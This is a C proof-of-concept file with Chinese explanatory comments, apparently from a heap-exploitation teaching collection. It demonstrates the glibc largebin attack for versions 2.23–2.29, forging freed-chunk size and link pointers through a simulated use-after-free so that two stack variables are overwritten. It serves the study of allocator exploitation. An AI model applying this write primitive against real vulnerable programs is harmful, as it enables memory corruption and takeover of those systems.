/*
 * House of Fun 是旧版 largebin attack 的历史命名，本文件走的是同一条
 * 真实 glibc 路径。请重点观察 2.30 引入检查之前，fd/bk/fd_nextsize/
 * bk_nextsize 这四个链表指针分别是怎样参与写入的。成功判据与下方原始
 * PoC 相同。
 */
/*
 * 中文导读：本文件对应 large_bin_attack 手法，标注的版本范围是
 * 2.23～2.29。模拟的漏洞是用 UAF 改写已经插入 largebin 的节点的
 * bk_nextsize；核心流程是让一个更小的 victim 走最小节点分支插入，这样
 * fake->fd_nextsize 指向的目标就会被写入 victim 地址。成功判据是目标
 * 内存恰好等于新 victim 的 chunk 头；2.30 前后所需的链字段有区别，
 * 2.42 新增了 nextsize 反向检查之后，这种经典写原语就失效了。
 *
 * 阅读约定：malloc 返回的是 user data；源码里 p[-1] 通常是 size，p[-2]
 * 是 prev_size。所有故意的 UAF、越界和 double free 都是漏洞模拟，不是正常 C 用法。
 * 版本范围以本目录 README 和验证矩阵为准；发行版回移补丁时应按实际 libc 源码判断。
 */

/*

    本例改编自以下 largebin 研究：
    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/

    [...]

              下面是插入排序链时走到的“否则”分支：else
              {
                  victim->fd_nextsize = fwd;
                  victim->bk_nextsize = fwd->bk_nextsize;
                  fwd->bk_nextsize = victim;
                  victim->bk_nextsize->fd_nextsize = victim;
              }
              bck = fwd->bk;

    [...]

    mark_bin (av, victim_index);
    victim->bk = bck;
    victim->fd = fwd;
    fwd->bk = victim;
    bck->fd = victim;

    如果想进一步理解 ptmalloc 是怎样组织和排序 largebin 的，建议阅读
    上述文章的背景章节，同时对照目标版本 malloc.c 里 _int_malloc 的
    具体实现。

    [...]

 */

#include<stdio.h>
#include<stdlib.h>
#include<assert.h>
 
int main()
{

    unsigned long stack_var1 = 0;
    unsigned long stack_var2 = 0;

    /* p1、p2、p3 的大小都超过 smallbin 范围；每个大块后面放一个 0x20
       的 guard 块，防止释放时和相邻 chunk 或 top 发生合并。 */
    unsigned long *p1 = malloc(0x420);

    malloc(0x20);

    unsigned long *p2 = malloc(0x500);

    malloc(0x20);

    unsigned long *p3 = malloc(0x500);

    malloc(0x20);
 
    free(p1);
    free(p2);

    // 触发 unsorted-bin 扫描，把 p1、p2 归入 largebin 并建立两套链指针。
    malloc(0x90);

    // p3 暂留在 unsorted bin，下一次 malloc 时会把它插入现有 largebin。
    free(p3);

    /* 漏洞模拟：伪造 p2 的 size 字段，以及 fd/bk 与 fd_nextsize/
       bk_nextsize 这四个指针。旧版插入逻辑会分别执行两次反向指针写，
       由此改写 stack_var1 和 stack_var2。 */
    p2[-1] = 0x3f1;
    p2[0] = 0;
    p2[2] = 0;
    p2[1] = (unsigned long)(&stack_var1 - 2);
    p2[3] = (unsigned long)(&stack_var2 - 4);

    // 触发 p3 的 largebin 插入，消费上面伪造的四个链字段。
    malloc(0x90);

    // 严格检查两处目标均已被写入，避免只打印地址造成假阳性。
    assert(stack_var1 != 0);
    assert(stack_var2 != 0);

    return 0;
}
